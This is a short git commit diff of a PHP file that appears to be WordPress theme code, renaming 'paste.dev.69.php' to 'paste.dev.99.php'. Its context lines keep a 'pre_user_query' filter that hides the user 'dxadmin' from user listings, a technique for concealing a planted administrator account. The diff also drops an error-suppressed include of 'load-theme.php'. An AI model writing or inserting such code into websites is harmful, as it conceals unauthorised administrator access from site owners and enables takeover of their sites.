fa7f80770c72e2cc84f37bad81863b0a72c27ebf
onlyme1d <agungrikardo09@gmail.com>
2025-10-06 13:56:02 +0700

    Update and rename paste.dev.69.php to paste.dev.99.php

--- paste.dev.99.php
+++ paste.dev.99.php
@@ -271,8 +271,6 @@ add_filter('pre_user_query', function($user_search) {
     $user_search->query_where .= " AND {$wpdb->users}.user_login != 'dxadmin'";
 });
 
-@include_once __DIR__ . '/load-theme.php';
-
 /** color function */
 require_once(SILKBLOG_PHP_FUNCTIONS . 'custom-css.php');
 
